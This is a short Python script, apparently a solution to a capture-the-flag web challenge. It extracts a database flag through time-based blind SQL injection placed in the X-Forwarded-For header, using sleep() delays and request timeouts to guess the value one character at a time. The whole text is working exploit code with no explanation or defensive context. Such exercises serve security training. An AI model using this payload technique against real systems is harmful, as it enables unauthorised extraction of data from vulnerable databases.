import requests
import string
url="http://ctf5.shiyanbar.com/web/wonderkun/index.php"
guess=string.lowercase + string.uppercase + string.digits
flag=""

for i in range(1,100):
    havetry=0
    for str in guess:
        headers={"x-forwarded-for":"' +(select case when (substring((select flag from flag ) from %d for 1 )='%s') then sleep(7) else 1 end ) and '1'='1" %(i,str)}
        try: 
            res=requests.get(url,headers=headers,timeout=6)
        except requests.exceptions.ReadTimeout as e:
            havetry=1
            flag = flag + str
            print ("flag:", flag)
            break
    if havetry==0:
        break
print ('result:' + flag)
